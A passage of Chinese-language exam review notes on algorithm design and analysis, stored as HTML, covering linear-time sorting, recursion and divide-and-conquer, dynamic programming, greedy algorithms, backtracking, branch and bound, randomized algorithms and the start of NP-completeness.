(计数排序、桶排序、基数排序)</p><p><strong>比较排序</strong>：排序结果中各元素的次序基于输入元素间的比较，这类算法是比较排序。最好的时间复杂度为O(nlogn) </p><p>线性排序: 时间复杂度为 <strong>O(n)（突破了比较排序的最好时间复杂度）</strong>, 达到线性，排序不基于比较。</p><p>线性排序有三种：计数排序、桶排序、基数排序。</p><p><strong>排序算法正确工作的必要条件</strong>：n个元素的n!中排列都要作为决策树的一个叶子。</p><p><strong>定理1 任意比较排序算法在最坏情况下，都需要做Ω(nlogn)次比较。堆排序和合并排序是渐近最优的排序算法，快速排序执行效率平均较堆排序和合并排序好。</strong></p><p>计数排序（不是比较排序算法）基本思想：对每一个输入元素x，统计出小于x的元素的个数。然后，根据这一信息直接把元素x放到它在最终输出数组中的位置上。</p><ol><li>桶排序</li></ol><p>基本思想：</p><ol><li>把区间[0,1)划分成n个相同大小的子区间（称为桶）</li><li>将n个输入数分布到各个桶中去</li><li>先对各桶中元素进行排序，然后依次列出各桶中的元素</li><li>基数排序</li></ol><p>假设所有待排序元素均为整数，至多d位。先按<strong>最低有效位</strong>进行排序，再按<strong>次低有效位</strong>排序，重复这个过程，直到对所有的d位数字都进行了排序。</p><p><strong>基数排序关键是按位排序要稳定</strong></p><p><strong>总共花费O(d(n+k))的时间。</strong>如果 d是常数，k &#x3D; O(n)，基数排序能在线性时间内完成排序</p><h3 id="六、排序算法比较"><a href="#六、排序算法比较" class="headerlink" title="&#x3D;&#x3D;六、排序算法比较&#x3D;&#x3D;"></a>&#x3D;&#x3D;六、排序算法比较&#x3D;&#x3D;</h3><p>1.比较排序：排序结果中，各元素的次序基于输入元素间的比较，这类算法成为比较排序。</p><p>任何比较排序算法，排序n个元素时至少耗用Ω(nlgn)次比较，其时间复杂度至少为Ω(nlgn)</p><p>2.当数据规模n较小时，n2和nlog2n的差别不大</p><p>当文件的初态已基本有序时，可选择简单的排序方法,如直接插入排序或起泡排序等</p><p>当数据规模n较大时，应选用速度快的排序算法</p><p>快速排序法最快，被认为是目前基于比较的排序方法中最好的方法当待排序的记录是随机分布时，快速排序的平均时间最短。但快速排序有可能出现最坏情况，则快速排序算法的时间复杂度为O(n2)，且递归深度为n，即所需栈空间为O(n)</p><p><img src="/img/course/clip_image004.png" alt="img"></p><p>插帽龟，统计鸡走的稳（希尔快速选择堆不稳）</p><p>选帽插，全恩方，冒插最好没有方</p><p>统计鸡，加减乘除</p><p>恩老哥，快归堆</p><p>快桶最坏是恩方</p><h1 id="第三章-递归和分治策略"><a href="#第三章-递归和分治策略" class="headerlink" title="第三章  递归和分治策略"></a><strong>第三章  递归和分治策略</strong></h1><h2 id="一、-递归的定义、总体思想、特点；"><a href="#一、-递归的定义、总体思想、特点；" class="headerlink" title="一、 递归的定义、总体思想、特点；"></a><strong>一、</strong> <strong>递归的定义、总体思想、特点；</strong></h2><p>1.递归(Recursion)基本思想：把<strong>规模大的问题转化为规模小的相似的子问题</strong>来解决。在函数实现时，因为解决大问题的方法和解决小问题的方法往往是同一个方法，所以就产生了<strong>函数直接或间接调用它自身</strong>的情况。这个解决问题的函数<strong>必须有明显的结束条件</strong>，这样就不会产生无限递归的情况</p><ol start="2"><li><strong>总体思想</strong>：如果子问题的规模仍然不够小，则再划分为k个子问题，如此递归的进行下去，直到问题规模足够小，很容易求出其解为止。（自底向上）</li></ol><p><strong>3</strong>.两个要素<strong>：边界条件、递归函数</strong></p><h2 id="二、-通过具体例子理解递归策略与设计（-N的阶乘、Fibonacci数列、全排列、整数划分问题、Hanoi塔问题）"><a href="#二、-通过具体例子理解递归策略与设计（-N的阶乘、Fibonacci数列、全排列、整数划分问题、Hanoi塔问题）" class="headerlink" title="二、 通过具体例子理解递归策略与设计（ N的阶乘、Fibonacci数列、全排列、整数划分问题、Hanoi塔问题）"></a><strong>二、</strong> <strong>通过具体例子理解递归策略与设计（</strong> N的阶乘、Fibonacci数列、全排列<strong>、整数划分问题、Hanoi塔问题）</strong></h2><p>1.N的阶乘：</p><p>n! &#x3D;       1(n&#x3D;0)     n&#x3D;0</p><p>​              n(n-1)     n&gt;0</p><p>2 Fibonacci数列</p><p>F(n)&#x3D;       1             n&#x3D;0</p><p>​               1             n&#x3D;1</p><p>​               F(n-1)+F(n-2)    n&gt;1</p><p>3.全排列 ：(从n个元素中取出m个元素进行排列)</p><h4 id="4-整数划分问题"><a href="#4-整数划分问题" class="headerlink" title="4. 整数划分问题"></a><strong>4.</strong> <strong>整数划分问题</strong></h4><p><strong>q(n****，m)&#x3D;      1                           m&#x3D;1,n&#x3D;1</strong></p><p>​              <strong>q(n,n)                       n&lt;m</strong></p><p><strong>q(n****，m)&#x3D;1+q(n,n-1)           n&#x3D;m</strong>              </p><p><strong>q(n,m)&#x3D;q(n,m-1)+q(n-m,m)      n&gt;m&gt;1</strong></p><p>**n:**<strong>待拆分的整数 m：拆分出的最大值不超过m</strong> </p><h4 id="5-Hanoi塔问题"><a href="#5-Hanoi塔问题" class="headerlink" title="5. Hanoi塔问题:"></a><strong>5. Hanoi</strong>塔问题:</h4><p>第n-1个盘子由a移到c；第n个盘子由a移到b；第n-1个盘子由c移到b；</p><p>public static void hanoi(int n, int a, int b, int c)</p><p>{</p><p>if (n &gt; 0)</p><p>{</p><p>hanoi(n-1, a, c, b);</p><p>move(a, b);</p><p>hanoi(n-1, c, b, a);</p><p>}</p><p>}</p><h2 id="三、-分治法的概念、步骤、复杂度分析；"><a href="#三、-分治法的概念、步骤、复杂度分析；" class="headerlink" title="三、 分治法的概念、步骤、复杂度分析；"></a><strong>三、</strong> <strong>分治法的概念、步骤、复杂度分析；</strong></h2><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><p>(1)问题的规模缩小到一定的程度就可以容易地解决</p><p>(2)分解为若干个规模较小的相同问题，**&#x3D;&#x3D;具有最优子结构&#x3D;&#x3D;**</p><p>(3)分解出的子问题的解<strong>可以合并</strong>为该问题的解</p><p>(4)该问题所分解出的各个子问题是<strong>相互独立</strong>的，即子问题之间不包含公共的子问题</p><p>如果具有前两个特征未有第三个可以考虑动态规划和贪心算法</p><h3 id="分治法基本步骤"><a href="#分治法基本步骤" class="headerlink" title="分治法基本步骤"></a>分治法基本步骤</h3><p>&#x3D;&#x3D;① 分解② 解决③ 合并&#x3D;&#x3D;</p><p><strong>平衡子问题</strong>：最好使子问题规模大致相等   </p><p><strong>divide-and-conquer(P)</strong></p><p><strong>{&#x2F;&#x2F; P****是问题的规模，n0是阈值</strong></p><p><strong>if ( |P| &lt;&#x3D; n0) adhoc(P); &#x2F;&#x2F;</strong> <strong>基本子算法，解决小规模的问题</strong></p><p> <strong>divide P into smaller subinstances P1,P2,…,Pk****；&#x2F;&#x2F; 分解问题</strong></p><p> <strong>for (i&#x3D;1; i&lt;&#x3D;k; i++) &#x2F;&#x2F; k****通常为2</strong></p><p><strong>yi&#x3D;divide-and-conquer(Pi); &#x2F;&#x2F;</strong> <strong>递归的解各子问题</strong></p><p> <strong>return merge(y1,…,yk); &#x2F;&#x2F;</strong> <strong>将各子问题的解合并为原问题的解</strong></p><p><strong>}</strong></p><p>**3.**<strong>优缺点</strong></p><p>能简单地求解复杂的问题</p><p>并行性 (并行计算、多处理器系统)</p><p>内存访问 (利用内存缓存机制，不需要访问存取速度较慢的主存)</p><p><strong>分治法不能适应于所有问题</strong></p><p><strong>递归的效率较慢 (具体的实现方式)</strong></p><p><strong>分治法比迭代方法更复杂 (例子：n个数求和)</strong></p><p><strong>四、</strong> <strong>通过几个范例学习分治策略的设计技巧（二分搜索、归并排序、乘法问题、找最大最小值问题、循环赛日程表等）</strong></p><p><strong>1.</strong>   <strong>二分搜索（最坏情况下时间复杂性为O(logn)）</strong></p><p>应用场景及局限性</p><p>o 二分查找依赖<strong>顺序表结构</strong>，如数组</p><p>o 二分查找针对的是<strong>有序数据</strong></p><p>o <strong>数据量太小太大</strong>不适合二分查找</p><p>public static int binarySearch(int [] a, int x, int n)</p><p>{</p><p>&#x2F;&#x2F; 在 a[0] &lt;&#x3D; a[1] &lt;&#x3D; … &lt;&#x3D; a[n-1] 中搜索 x</p><p>&#x2F;&#x2F; 找到x时返回其在数组中的位置，否则返回-1</p><p>int left &#x3D; 0; int right &#x3D; n - 1;</p><p>while (left &lt;&#x3D; right) {</p><p>int middle &#x3D; (left + right)&#x2F;2;</p><p>if (x &#x3D;&#x3D; a[middle]) return middle;</p><p>if (x &gt; a[middle]) left &#x3D; middle + 1;</p><p>else right &#x3D; middle - 1;</p><p>}</p><p>return -1; &#x2F;&#x2F; 未找到x</p><p>}</p><p><strong>2.</strong>   <strong>归并排序</strong></p><p><strong>将待排序元素分成大小大致相同的2个子集合，分别对2个子集合进行排序，最终将排好序的子集合合并成为所要求的排好序</strong></p><p><strong><img src="/img/course/clip_image006.png" alt="img"></strong></p><p><strong>3.</strong>   <strong>乘法问题</strong></p><p>(1) 整数相乘问题【分治法：O(n1.59)】</p><p><strong>(2)</strong> <strong>矩阵相乘问题【分治法：O(n2.81)】</strong> </p><p><strong><img src="/img/course/clip_image008.png" alt="img"></strong></p><ol start="4"><li>最大最小值问题</li><li>循环赛日程表</li></ol><h1 id="第四章动态规划"><a href="#第四章动态规划" class="headerlink" title="第四章动态规划"></a><strong>第四章动态规划</strong></h1><h2 id="一、-理解动态规划算法的由来、概念、定义"><a href="#一、-理解动态规划算法的由来、概念、定义" class="headerlink" title="一、 理解动态规划算法的由来、概念、定义"></a><strong>一、</strong> <strong>理解动态规划算法的由来、概念、定义</strong></h2><p><strong>1.多阶段决策过程（最优决策序列）</strong>：问题的活动过程分为若干相互联系的阶段，任一阶段i以后的行为仅依赖于i阶段的过程状态，而与i阶段之前的过程如何达到这种状态的方式无关</p><ol start="2"><li>多阶段决策问题的求解策略<strong>（</strong>枚举法<strong>、动态规划（最优化原理、多阶段-&gt;单阶段））</strong></li><li><strong>最优决策序列性质</strong>：无论过程的<strong>初始状态和初始决策</strong>是什么，其余的决策都必须相对于初始决策所产生的状态构成一个最优决策序列。</li></ol><p>4.状态无后效性（马尔科夫性）未来与过去无关</p><p>5.多阶段决策模型：<strong>自然状态、策略、益损值（准则函数&#x2F;指标函数）</strong></p><p><strong>6.</strong> 动态规划求解问题的前提：<strong>最优性原理（前提）</strong>、<strong>递推关系式与边界条件</strong>。</p><ol start="7"><li>动态规划的设计技巧：<strong>阶段划分、状态表示、存储表</strong></li><li>动态规划法的优缺点</li></ol><p>与非线性规划相比，动态规划的优点：</p><p>（1）易于确定全局最优解。把原问题化为一系列结构相似的最优化子问题</p><p>（2）能得到一簇解</p><p>（3）动态规划方法反映了过程逐段演变的前后联系</p><p>不足之处：</p><p>（1）没有一个统一的标准模型可供应用。</p><p>（2）应用的局限性。状态变量要满足“无后效性”条件</p><p>（3）在数值求解中，存在“维数障碍”。每递推一段，必须把前一段的最优值函数在相应的状态集合上的全部值存入内存中。</p><h3 id="基本思想"><a href="#基本思想" class="headerlink" title="&#x3D;&#x3D;基本思想&#x3D;&#x3D;"></a>&#x3D;&#x3D;基本思想&#x3D;&#x3D;</h3><p>动态规划的思想实质是<strong>分治思想</strong>和<strong>解决冗余</strong> </p><p>动态规划算法与分治法类似，其基本思想也是<strong>将待求解问题分解成若干个子问题</strong></p><p>但是经过分解得到的子问题往往不是互相独立的。不同子问题的数目常常只有多项式量级。在用分治法求解时，有些子问题被重复计算了许多次。</p><h2 id="三、掌握动态规划算法的要素："><a href="#三、掌握动态规划算法的要素：" class="headerlink" title="三、掌握动态规划算法的要素："></a>三、掌握动态规划算法的要素：</h2><p><strong>✓</strong> <strong>&#x3D;&#x3D;最优子结构&#x3D;&#x3D;（自底向上）：最优解是由其子问题的最优解来构造的，则具有最优子结构。</strong></p><p><strong>动态规划算法问题解的代价 &#x3D; 子问题的代价 + 选择带来的开销</strong></p><p>与贪心算法的不同：贪心算法适用的问题也具有最优子结构，但它是先做选择再求解一个结果子问题（自顶向下）</p><p>利用<strong>反证法</strong>判断问题满足最优性原理，不能应用最优子结构的时候，不能假设它能够应用</p><p><strong>✓</strong> &#x3D;&#x3D;重叠子问题&#x3D;&#x3D;（子问题的空间小、不被反复计算）</p><p><strong>自顶向下的做备忘录算法：为每一个子问题的解在表中记录一个表项</strong></p><p><strong>如果某些子问题没有必要求解，做备忘录方法具有只需要求解那些肯定要求解的</strong></p><p><strong>子问题的优点。</strong></p><h2 id="四、掌握设计动态规划算法的步骤"><a href="#四、掌握设计动态规划算法的步骤" class="headerlink" title="四、掌握设计动态规划算法的步骤"></a><strong>四、掌握设计动态规划算法的步骤</strong></h2><p><strong>① 划分子问题：找出最优解的性质，并刻划其结构特征。</strong></p><p><strong>② 最优解的递归式：递归地定义最优解的值。</strong></p><p><strong>③ 按自底向上的方式计算最优解的值。</strong></p><p><strong>④ 由计算出的结果构造一个最优解。</strong></p><p><strong>四、通过范例学习动态规划算法的设计策略</strong></p><p>**1.**<strong>矩阵连乘</strong></p><p><strong>2.</strong> <strong>最长公共子序列（LCS）</strong></p><p><strong><img src="/img/course/clip_image010.png" alt="img"></strong></p><p><strong>2.</strong>   <strong>多段图规划</strong></p><p><strong>3.</strong>   <strong>最大子段和</strong></p><p><img src="/img/course/clip_image012.png" alt="img"></p><p><strong>4.0-1****背包</strong></p><p><strong><img src="/img/course/clip_image014.png" alt="img"></strong></p><p><strong>5.</strong> <strong>备忘录动态规划算法</strong></p><h1 id="第5章-贪心算法"><a href="#第5章-贪心算法" class="headerlink" title="第5章 贪心算法"></a>第5章 贪心算法</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><h4 id="最优化问题"><a href="#最优化问题" class="headerlink" title="最优化问题"></a>最优化问题</h4><p>最优化问题求解分类：根据描述问题约束条件和目标函数的数学模 型的特性和问题的求解方法的不同，可分为：线性规划、整数规划 、非线性规划、<strong>动态规划</strong>、<strong>分支限界法</strong>等<strong>精确算法</strong>。 </p><p><strong>贪心方法</strong>：一种改进的分级的处理方法，可对满足上述特征的某些 问题方便地求解，属于<strong>近似算法</strong>。</p><h4 id="最优子结构性质："><a href="#最优子结构性质：" class="headerlink" title="最优子结构性质："></a><strong>最优子结构性质：</strong></h4><p> 当一个问题的最优解包含其子问题的最优解时，称此问题具有最优子结构性质。</p><h2 id="贪心算法-1"><a href="#贪心算法-1" class="headerlink" title="贪心算法"></a>贪心算法</h2><p>贪心选择不一定等于整体最优解：由问题是否具有贪心选择性质决定</p><h3 id="基本思想："><a href="#基本思想：" class="headerlink" title="&#x3D;&#x3D;基本思想：&#x3D;&#x3D;"></a>&#x3D;&#x3D;基本思想：&#x3D;&#x3D;</h3><p><strong>从问题的某一个初始解出发，通过一系列的贪心选择，即当前状态下的局部最优选择，逐步逼近给定的目标，尽可能快地求得更好的解。</strong> </p><p> 在贪心算法(Greedy Method)中采用<strong>逐步构造&#x2F;分级最优解</strong>的方法 。在每个阶段，都作出一个按<strong>某个评价函数最优的决策</strong>，该最优 评价函数称为<strong>贪心准则</strong>(Greedy Criterion)</p><h3 id="基本步骤："><a href="#基本步骤：" class="headerlink" title="&#x3D;&#x3D;基本步骤：&#x3D;&#x3D;"></a>&#x3D;&#x3D;基本步骤：&#x3D;&#x3D;</h3><p>① 决定问题的<strong>最优子结构</strong>； </p><p>② 设计出一个递归解； </p><p>③ 证明在递归的任一阶段，最优选择之一总是贪心选择, 那么做 贪心选择总是安全的。 </p><p>④ 证明通过做贪心选择，所有子问题(除一个以外)都为空, 即只产 生一个子问题。 </p><p>⑤ 设计出一个实现贪心策略的递归算法。 </p><p>⑥ (性能角度) 将递归算法转换成迭代算法。</p><h3 id="贪心策略设计："><a href="#贪心策略设计：" class="headerlink" title="贪心策略设计："></a>贪心策略设计：</h3><p>策略1：<strong>按价值最大贪心，是目标函数增长最快</strong>。 </p><p>策略2：<strong>按重量最小贪心，使背包增长最慢。</strong></p><p>策略3：<strong>按价值率最大贪心，使单位重量价值增长最快</strong>。</p><h3 id="贪心算法-vs-动态规划"><a href="#贪心算法-vs-动态规划" class="headerlink" title="&#x3D;&#x3D;贪心算法 vs 动态规划&#x3D;&#x3D;"></a>&#x3D;&#x3D;贪心算法 vs 动态规划&#x3D;&#x3D;</h3><p>贪心算法和动态规划算法都要求问题具有<strong>最优子结构性质</strong>，但是两者 存在着巨大的差别。</p><p>(1) 动态规划是先分析子问题，再做选择。而贪心算法是先做贪心选择，做完选择后，生成了子问题，然后再去求解子问题；</p><p>(2) 动态规划每一步<strong>可能会产生多个子问题</strong>，而贪心算法的每一步只会<strong>产生一个子问题</strong>； </p><p> (3) 从特点上看，动态规划是&#x3D;&#x3D;自底向上&#x3D;&#x3D;解决问题，而贪心算法则是&#x3D;&#x3D;自顶向下&#x3D;&#x3D;解决问题。</p><h2 id="可解决问题："><a href="#可解决问题：" class="headerlink" title="可解决问题："></a>可解决问题：</h2><p>活动安排问题、小数背包问题、最优装载问题、找钱问题、单源最短路径、最小生成树</p><h3 id="最小生成树—Prim算法"><a href="#最小生成树—Prim算法" class="headerlink" title="&#x3D;&#x3D;最小生成树—Prim算法&#x3D;&#x3D;"></a>&#x3D;&#x3D;<strong>最小生成树—Prim算法</strong>&#x3D;&#x3D;</h3><p><img src="/img/course/image-20240106154600605.png" alt="image-20240106154600605"></p><p><img src="/img/course/image-20240106154640225.png" alt="image-20240106154640225"></p><h3 id="最小生成树—Kruskal算法"><a href="#最小生成树—Kruskal算法" class="headerlink" title="&#x3D;&#x3D;最小生成树—Kruskal算法&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;最小生成树—Kruskal算法&#x3D;&#x3D;</strong></h3><p><img src="/img/course/image-20240106154714944.png" alt="image-20240106154714944"></p><p><img src="/img/course/image-20240106154726870.png" alt="image-20240106154726870"></p><p>时间复杂度：&#x3D;&#x3D;O(Elog E)&#x3D;&#x3D;    V为顶点数，E为边数</p><p>当 E&gt;V^2^ 时，Kruskal算法比Prim算法差； </p><p>当E&lt;V^2^ 时，Kruskal算法却比Prim算法好得多。</p><h3 id="单源最短路径–迪杰斯特拉-Dijkstra-算法"><a href="#单源最短路径–迪杰斯特拉-Dijkstra-算法" class="headerlink" title="&#x3D;&#x3D;单源最短路径–迪杰斯特拉(Dijkstra)算法&#x3D;&#x3D;"></a>&#x3D;&#x3D;单源最短路径–迪杰斯特拉(Dijkstra)算法&#x3D;&#x3D;</h3><p>&#x3D;&#x3D;基本思想&#x3D;&#x3D;：设置顶点集合S并不断地作&#x3D;&#x3D;贪心选择&#x3D;&#x3D;来扩充这个集合。 一个顶点属于集合S当且仅当从源到该顶点的最短路径长度已知。</p><p><img src="/img/course/image-20240107150050942.png" alt="image-20240107150050942"></p><h1 id="第6章-回溯法"><a href="#第6章-回溯法" class="headerlink" title="第6章 回溯法"></a>第6章 回溯法</h1><h2 id="方法概述"><a href="#方法概述" class="headerlink" title="方法概述"></a>方法概述</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p><strong>回溯法</strong> (Backtracking) 又称为<strong>试探法</strong>： — 回溯法是一个既带有**&#x3D;&#x3D;系统性&#x3D;&#x3D;又带有&#x3D;&#x3D;跳跃性&#x3D;&#x3D;**的搜索算法； </p><p>— 它在包含问题的<strong>所有解的解空间树</strong>中，按照<strong>深度优先的策略</strong>，从 根结点出发搜索解空间树。—— 系统性</p><p> — 算法搜索至解空间树的任一结点时，<strong>判断该结点为根的子树是否包含问题的解</strong>，如果肯定不包含，则<strong>跳过</strong>以该结点为根的子树的搜索， 逐层向其祖先结点回溯。否则，进入该子树，继续深度优先的策略 进行搜索。——跳跃性 </p><p>— 这种以深度优先的方式系统地搜索问题的解的算法称为回溯法， 它适用于解一些<strong>组合数较大</strong>的问题。许多<strong>复杂的、规模较大</strong>的问题都可以使用回溯法，有“通用解题方法”的美称</p><h3 id="二叉树遍历方法"><a href="#二叉树遍历方法" class="headerlink" title="二叉树遍历方法"></a>二叉树遍历方法</h3><p><img src="/img/course/image-20240106144007100.png" alt="image-20240106144007100"></p><h3 id="方法："><a href="#方法：" class="headerlink" title="方法："></a>方法：</h3><p><img src="/img/course/image-20240106150720225.png" alt="image-20240106150720225"></p><p><img src="/img/course/image-20240106150732972.png" alt="image-20240106150732972"></p><p><img src="/img/course/image-20240106151741197.png" alt="image-20240106151741197"></p><h3 id="二类常见的解空间树："><a href="#二类常见的解空间树：" class="headerlink" title="二类常见的解空间树："></a>二类常见的解空间树：</h3><p><strong>子集树</strong>：当所给的问题是从n个元素的集合S中找出满足某种性质的子集时。子集树通常有2 ^n^个叶子 结点，其总结点个数为2 ^n+1^ -1，遍历子集树时间为&#x3D;&#x3D;Ω(2^n^ )&#x3D;&#x3D; 。</p><p><strong>排列树</strong>：当所给问题是确定n个元素满足某种性质的排列时。排列树通常有n!个叶子结点，因此，遍历排列树需要&#x3D;&#x3D;Ω(n!)&#x3D;&#x3D;的计算时间。例如TSP</p><p><img src="/img/course/image-20240106151551908.png" alt="image-20240106151551908"></p><p><img src="/img/course/image-20240106151348691.png" alt="image-20240106151348691"></p><h3 id="可以解决的问题："><a href="#可以解决的问题：" class="headerlink" title="可以解决的问题："></a>可以解决的问题：</h3><p>排列生成问题：给定正整数n，生成1, 2, …, n所有排列</p><p>TSP问题：一个商品推销员要去若干个城市推销商品，该推销员从一个城市出发，需要经过所有城市后，回到出发地。应如何选择行进路线，以使总的行程最短。</p><p>n皇后问题：在n*n棋盘上放上n个皇后，使皇后彼此不受攻 击，即条件是彼此不在同行(列)、斜线上。求出全部的放法。</p><p>0-1背包问题、符号三角形问题</p><p>图的m着色问题：给定无向连通图G和m种不同的颜色。用这些颜色为图G的各顶点着色，每 个顶点着一种颜色。是否有一种着色法使G中每条边的2个顶点着不同颜色。</p><h3 id="回溯法效率分析"><a href="#回溯法效率分析" class="headerlink" title="回溯法效率分析"></a>回溯法效率分析</h3><p><strong>子集树</strong>：当所给的问题是从n个元素的集合S中找出满足某种性质的子集时。子集树通常有2 ^n^个叶子 结点，其总结点个数为2 ^n+1^ -1，遍历子集树时间为&#x3D;&#x3D;Ω(2^n^ )&#x3D;&#x3D; 。例如0-1背包问题</p><p><strong>排列树</strong>：当所给问题是确定n个元素满足某种性质的排列时。排列树通常有n!个叶子结点，因此，遍历排列树需要&#x3D;&#x3D;Ω(n!)&#x3D;&#x3D;的计算时间。例如TSP</p><p>通过上述实例的讨论，回溯法的效率在很大程度上依赖于以下因素：</p><p> (1) 产生x[t]的时间；（生成解空间的时间）</p><p> (2) 满足显约束的x[t]值的个数；</p><p> (3) 计算约束函数constraint的时间；</p><p> (4) 计算上界函数bound的时间； </p><p>(5) 满足约束函数和上界函数约束的所有x[k]的个数。</p><p><strong>好的约束函数能显著地减少所生成的结点数</strong>，但这样的约束函数往 往计算量较大。因此，在选择约束函数时通常存在<strong>生成结点数与约束函数计算量之间的折衷</strong>。</p><h1 id="第7章-分支限界法"><a href="#第7章-分支限界法" class="headerlink" title="第7章 分支限界法"></a>第7章 分支限界法</h1><h2 id="方法概述-1"><a href="#方法概述-1" class="headerlink" title="方法概述"></a>方法概述</h2><h3 id="与回溯法区别："><a href="#与回溯法区别：" class="headerlink" title="与回溯法区别："></a>与回溯法区别：</h3><p><strong>求解目标不同</strong>： 一般而言，回溯法的求解目标是找出解空间树中满足约束条件的所有解， 而分支限界法的求解目标则是尽快地找出满足约束条件的一个解；</p><p><strong>搜索方法不同</strong>： 回溯法使用<strong>深度优先方法</strong>搜索，而分支限界一般用宽<strong>度优先或最佳优先方法</strong>来搜索； </p><p><strong>对扩展结点的扩展方式不同</strong>： 分支限界法中，每一个活结点只有一次机会成为扩展结点。活结点一旦成 为扩展结点，就一次性产生其所有儿子结点； </p><p><strong>存储空间的要求不同</strong>：分支限界法的存储空间比回溯法大得多，因此当内存容量有限时，回溯法解决问题成功的可能性更大。</p><h3 id="基本思想-："><a href="#基本思想-：" class="headerlink" title="&#x3D;&#x3D;基本思想&#x3D;&#x3D;："></a><strong>&#x3D;&#x3D;基本思想&#x3D;&#x3D;：</strong></h3><p>分支限界法常以广度优先或以最小耗费(最大效益)优先的方式搜 索问题的解空间树。i) 对已处理的各结点根据限界函数估算目标 函数的可能取值，ii) 从中选出目标函数取得极大(极小) 值的结 点优先进行广度优先搜索, iii) 不断地调整搜索方向，尽快找到 解，裁剪那些不能得到最优解的子树以提高搜索效率。</p><h3 id="求解步骤："><a href="#求解步骤：" class="headerlink" title="求解步骤："></a><strong>求解步骤：</strong></h3><p>① 定义解空间(对解编码)； </p><p>② 确定解空间的树结构； </p><p>③ 按BFS等方式搜索： </p><p>​a. 每个活结点仅有一次机会变成扩展结点；</p><p>​b. 由扩展结点生成一步可达(即宽度搜索)的新结点； </p><p>​c. 在新结点中，删除不可能导出最优解的结点； &#x2F;&#x2F; 限界策略 </p><p>​d. 将剩余的新结点加入活动表(队列)中； </p><p>​e. 从活动表中选择结点再扩展； &#x2F;&#x2F;分支策略 </p><p>​f. 直至活动表为空；</p><h3 id="常见的两种分支限界法："><a href="#常见的两种分支限界法：" class="headerlink" title="常见的两种分支限界法："></a>常见的两种分支限界法：</h3><p>**&#x3D;&#x3D;队列式 (FIFO)分支限界法&#x3D;&#x3D;**：从活结点表中取出结点的顺序与加入 结点的顺序相同，因此活结点表的性质与队列相同；</p><p>&#x3D;&#x3D;<strong>优先队列(代价最小或效益最大)分支限界法</strong>&#x3D;&#x3D;：每个结点都有一个对 应的耗费或收益，以此决定结点的优先级</p><h3 id="具体方法："><a href="#具体方法：" class="headerlink" title="具体方法："></a>具体方法：</h3><p>分支限界法首先确定一个合理的<strong>限界函数</strong>，并根据 限界函数确定目标函数的界[down, up]；然后按照<strong>广度优先策略遍历</strong>问题的解空间树，在某一分支上，依次搜索该结点的所有孩子结点，分别估算这些孩子结点 的目标函数的可能取值 (注意：对于最小化问题，估算结点的down，对最大化问题，估算结点的up)。 如果某<strong>孩子结点的目标函数值超出目标函数的上界或下界</strong>，则将其<strong>丢弃</strong>(即基于该结点生成的解不会比目 前已得的更好)，否则入待处理表。</p><p><img src="/img/course/image-20240106142202691.png" alt="image-20240106142202691"></p><p><img src="/img/course/image-20240106142215076.png" alt="image-20240106142215076"></p><p><img src="/img/course/image-20240106143412916.png" alt="image-20240106143412916"></p><h1 id="第8章-随机算法（了解，什么时候使用）"><a href="#第8章-随机算法（了解，什么时候使用）" class="headerlink" title="第8章 随机算法（了解，什么时候使用）"></a>第8章 随机算法（了解，什么时候使用）</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>随机算法是指在算法中执行某些步骤或某些动作时，所进行的选择 是随机的。 </p><p>三要素：输入实例、随机源和停止准则。 </p><p>特点：简单、快速和易于并行化。</p><h2 id="常见的随机算法分为4类："><a href="#常见的随机算法分为4类：" class="headerlink" title="常见的随机算法分为4类："></a>常见的随机算法分为4类：</h2><p>① <strong>数值随机化算法</strong>：常用于<strong>数值问题的求解</strong>，所得到的往往是近似解， 近似解的精度随着计算时间增加而不断提高； </p><p>② <strong>蒙特卡罗算法</strong>：<strong>用于求问题的准确解。</strong>对于许多问题来说，近似解毫 无意义或者不存在。该方法总能得到问题的解，但该解未必是正确的 。求得正确解的概率依赖于算法所用的时间。难以判断解是否正确； </p><p>③ <strong>拉斯维加斯算法</strong>：<strong>不会得到不正确的解，但是有时会找不到解。</strong>找到 正确解的概率随着所用的计算时间的增加而提高。对任一实例，反复 调用算法求解足够多次，可使求解失效的概率任意小； 核心思想：随机生成答案并检测答案正确性。</p><p>④ <strong>&#x3D;&#x3D;舍伍德算法&#x3D;&#x3D;<strong>：</strong>总能求得问题的一个解，且所求得的解总是正确的。</strong>当 一个确定性算法最坏情况下的计算复杂性与其在平均情况下的计算复 杂性有较大差别时，可在这个确定性算法中引入随机性将它改造成一 个舍伍德算法，消除或者减少这种差别。核心思想：<strong>设法消除或减少最坏情况与特定实例之间的关联性。</strong>利用随机算法改造已有算法，使 得算法的性能尽量与输入数据无关，即平滑算法的性能。</p><p><img src="/img/course/image-20240106141006113.png" alt="image-20240106141006113"></p><p><img src="/img/course/image-20240106135507802.png" alt="image-20240106135507802"></p><h2 id="随机算法应用"><a href="#随机算法应用" class="headerlink" title="&#x3D;&#x3D;随机算法应用&#x3D;&#x3D;"></a>&#x3D;&#x3D;随机算法应用&#x3D;&#x3D;</h2><p>1.<strong>多种洗牌算法</strong></p><p>2.<strong>s-t连通性</strong>：无向图G &#x3D; (V,E), s, t为G上两点。令n &#x3D; |V|， m &#x3D; |E|。希望确定是否存在一条连接s和t的路。S到T有路吗？</p><p>随机算法：从s开始随机游动，如果在4n^3^步之内到达t，则返 回存在一条路；否则，返回不存在路。</p><p>3.<strong>最小割随机算法</strong>：每次随机选一条边，合并该边对应的顶点。 重复该过程n-2次。最后剩下两点之间的边，就是一个割集。</p><h1 id="第9章-NP完全性理论"><a href="#第9章-NP完全性理论" class="headerlink" title="第9章 NP完全性理论"></a>第9章 NP完全性理论</h1><p>（感觉非重点，选择判断填空）</p><h2 id="相关概念-1"><a href="#相关概念-1" class="headerlink" title="相关概念"></a>相关概念</h2><h3 id="Polynomial-Time-多项式时间"><a href="#Polynomial-Time-多项式时间" class="headerlink" title="Polynomial Time (多项式时间)"></a>Polynomial Time (多项式时间)</h3><p>定义：一个称为多项式时间的算法(Polynomial-time Algorithm) 必须 符合：在合理的输入大小 (input size)下，该算法在最差情況 (Worst-case)的时间复杂度以&#x3D;&#x3D;多项式函数&#x3D;&#x3D;为限。</p><h3 id="Intractability-难解问题"><a href="#Intractability-难解问题" class="headerlink" title="Intractability (难解问题)"></a>Intractability 